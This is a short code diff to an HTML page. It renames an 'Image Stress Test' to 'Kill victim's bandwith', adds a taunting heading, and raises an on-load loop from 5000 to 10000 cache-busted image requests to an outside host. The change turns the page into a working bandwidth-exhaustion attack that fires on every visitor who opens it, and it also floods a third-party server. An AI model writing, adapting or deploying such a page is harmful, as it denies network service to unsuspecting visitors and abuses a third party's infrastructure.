@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Image Stress Test</title>
+  <title>Kill victim's bandwith</title>
 </head>
 <body>
-  <h1>Loading 50 images...</h1>
+  <h1>Are you still connected to internet :)?</h1>
   <script>
     const imageUrl = 'https://one.one.one.one/fc4f07e27b83408acb2de2c979b06322.jpg';
 
-    for (let i = 0; i < 5000; i++) {
+    for (let i = 0; i < 10000; i++) {
       const cacheBuster = Math.random().toString(36).substring(2);
       const img = new Image();
       img.src = `${imageUrl}?cb=${cacheBuster}`;
